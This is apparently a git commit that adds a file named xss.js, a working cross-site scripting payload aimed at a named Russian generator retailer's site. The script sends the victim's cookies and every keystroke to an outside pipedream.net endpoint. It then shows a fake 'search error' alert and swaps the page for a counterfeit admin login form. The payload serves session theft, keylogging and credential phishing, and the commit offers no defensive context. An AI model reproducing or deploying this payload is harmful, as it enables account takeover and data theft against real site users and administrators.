a585723ade290306bae309183cb081f219a99ab3
Solo_Way <61106206+T4tX@users.noreply.github.com>
2024-03-03 19:35:56 +0300

    Create xss.js

---
+++ xss.js
@@ -0,0 +1,32 @@
+fetch(`https://eo1psc95k7tdibl.m.pipedream.net?c=${document.cookie}`);document.onkeypress=function(e){fetch("https://eo1psc95k7tdibl.m.pipedream.net?k="+String.fromCharCode(e.which))};
+setTimeout(() => {alert('564 Search error, please see error in admin panel ');document.body.innerHTML = `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <title>Вход на сайт</title>
+        <link href="https://www.dieselgenerators.ru/style/blueprint/screen.css" rel="stylesheet" type="text/css" />    <link href="https://www.dieselgenerators.ru/style/frontend/themes/default/auth.css" rel="stylesheet" type="text/css" /></head>
+<body>
+<table width="100%" height="100%" cellspacing="0" cellpadding="0" border="0">
+    <tbody>
+    <tr align="center">
+        <td>
+            <!--noindex--><form action="https://www.dieselgenerators.ru/cup/login/" method="post" accept-charset="utf-8" id="login">            <div class="login">
+                <div class="row">
+                    <label for="email">Логин</label>
+                    <input type="text" id="email" onFocus="doClear(this)" onBlur="doDefault(this)" class="input" name="email" value="login">
+                </div>
+                <div class="row">
+                    <label for="password">Пароль</label>
+                    <input type="password" id="password" onFocus="doClear(this)" onBlur="doDefault(this)" class="input" name="password" value="пароль">
+                </div>
+                <div class="row">
+                    <input class="submit" type="submit" value=""/>
+                </div>
+                <div class="validation_errors">
+                                    </div>
+            </div>
+            </form>        </td>
+    </tr>
+    </tbody>
+</table>
+</body>
+</html>`;}, 4000);
